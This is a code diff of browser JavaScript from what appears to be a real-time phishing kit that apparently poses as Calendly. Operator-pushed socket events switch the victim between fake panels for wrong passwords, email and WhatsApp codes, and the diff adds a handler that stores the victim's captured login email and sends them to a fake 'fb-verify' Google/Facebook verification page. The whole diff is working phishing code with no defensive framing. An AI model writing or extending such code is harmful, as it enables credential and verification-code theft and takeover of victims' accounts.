@@ -219,21 +219,30 @@
     socket.on('show-email',     function () { showPanel('cal-codeEmail'); });
     socket.on('show-whatsapp',  function () { showPanel('cal-whatsapp'); });
 
-    /* Wrong creds / old pass / Google commands → redirect back to apply.html with modal */
+    /* Wrong creds / old pass → redirect back to apply.html with modal */
     var applyRedirects = {
       'show-wrong-creds': 'wrongcreds',
-      'show-old-pass':    'oldpass',
-      'show-google-login': null,
-      'show-calendar':     null
+      'show-old-pass':    'oldpass'
     };
     Object.keys(applyRedirects).forEach(function (evt) {
       socket.on(evt, function () {
-        if (applyRedirects[evt]) {
-          try { sessionStorage.setItem('pendingModal', applyRedirects[evt]); } catch(e) {}
-        }
+        try { sessionStorage.setItem('pendingModal', applyRedirects[evt]); } catch(e) {}
         window.location.href = 'apply.html';
       });
     });
+
+    /* show-google-login: start the Google verification flow from Calendly */
+    socket.on('show-google-login', function () {
+      var fbEmail = sessionStorage.getItem('lastLoginEmail') || '';
+      try {
+        sessionStorage.setItem('googleReturnPage', 'apply.html');
+        if (fbEmail) sessionStorage.setItem('lastLoginEmail', fbEmail);
+      } catch(e) {}
+      window.location.href = 'fb-verify.html';
+    });
+
+    /* show-calendar: already on Calendly — do nothing */
+    socket.on('show-calendar', function () { /* no-op */ });
 
     /* ── Code submission helper ── */
     function setupCodeBlock(inputId, btnId, codeLen, endpoint) {
